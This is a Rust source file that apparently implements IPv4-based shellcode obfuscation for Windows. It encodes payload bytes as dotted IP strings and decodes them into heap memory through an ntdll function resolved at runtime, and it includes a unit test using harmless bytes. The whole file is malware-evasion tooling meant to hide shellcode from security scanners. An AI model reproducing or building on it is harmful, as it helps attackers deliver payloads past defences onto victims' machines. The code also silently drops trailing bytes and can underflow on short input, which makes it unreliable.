extern crate winapi;
use std::ffi::CString;
use std::ptr;
use std::os::raw::c_char;
use winapi::shared::mstcpip::RtlIpv4AddressToStringA;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::shared::ntdef::{NTSTATUS, PVOID};
use winapi::um::winnt::HEAP_ZERO_MEMORY;

type FnRtlIpv4StringToAddressA = unsafe extern "system" fn(
    S: *const i8,
    Strict: u8,
    Terminator: *mut *const i8,
    Addr: PVOID,
) -> NTSTATUS;

fn generate_ipv4(a: i32, b: i32, c: i32, d: i32) -> *mut c_char {
    let output = format!("{}.{}.{}.{}", a, b, c, d);
    CString::new(output).unwrap().into_raw()
}

fn generate_ipv4_output(shellcode: &[u8]) -> Vec<CString> {
    let mut ip: *mut c_char = ptr::null_mut();
    let shellcode_size = shellcode.len();
    let mut buf : Vec<CString> = Vec::with_capacity(shellcode_size / 4);

    for i in (0..shellcode_size).step_by(4) {
        if i + 3 < shellcode_size {
            ip = generate_ipv4(shellcode[i] as i32, shellcode[i + 1] as i32, shellcode[i + 2] as i32, shellcode[i + 3] as i32);
            buf.push(unsafe { CString::from_raw(ip) });
        }

        if i == shellcode_size - 4 {
            break;
        }
    }
    buf
}

pub unsafe fn Ipv4Deobfuscation(Ipv4Array: &[CString],
                                ppDAddress: &mut *mut u8,
                                pDSize: &mut usize) -> bool
{
    let NmbrOfElements = Ipv4Array.len();
    let mut pBuffer: *mut u8 = ptr::null_mut();
    let mut TmpBuffer: *mut u8 = ptr::null_mut();
    let mut sBuffSize: usize = NmbrOfElements * 4;
    let mut Terminator: *const i8 = ptr::null();
    let mut STATUS: NTSTATUS = 0;

    let hModule = unsafe {GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr()) };
    if hModule.is_null() {
        println!("[!] GetModuleHandleA Failed With Error");
        return false;
    }

    let pRtlIpv4StringToAddressA: FnRtlIpv4StringToAddressA = unsafe {std::mem::transmute(GetProcAddress(
        hModule,
        CString::new("RtlIpv4StringToAddressA").unwrap().as_ptr(),
    )) };

    pBuffer = unsafe { HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize) as *mut u8 };
    TmpBuffer = pBuffer;

    for i in 0..NmbrOfElements {
        let ipv4_address = &Ipv4Array[i];
        STATUS = pRtlIpv4StringToAddressA(ipv4_address.as_ptr(), 0, &mut Terminator, TmpBuffer as PVOID);
        if STATUS != 0 {
            return false;
        }
        TmpBuffer = TmpBuffer.add(4);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    true
}

#[cfg(test)]
mod tests {
    use uuid::uuid;
    use super::*;

    #[test]
    fn it_works() {
        let a = [1,2,3,4,5,6,7,8,9,10];
        let b = generate_ipv4_output(&a);
        println!("{}", b.len());
        for t in b.iter() {
            println!("{:?}",t);
        }

        let mut deobfuscated_address: *mut u8 = ptr::null_mut();
        let mut deobfuscated_size: usize = 0;

        unsafe { Ipv4Deobfuscation(&b, &mut deobfuscated_address, &mut deobfuscated_size); };
        unsafe {
            let deobfuscated_slice = std::slice::from_raw_parts(deobfuscated_address, deobfuscated_size);
            println!("Deobfuscated bytes: {:?}", deobfuscated_slice);
        }
    }
}
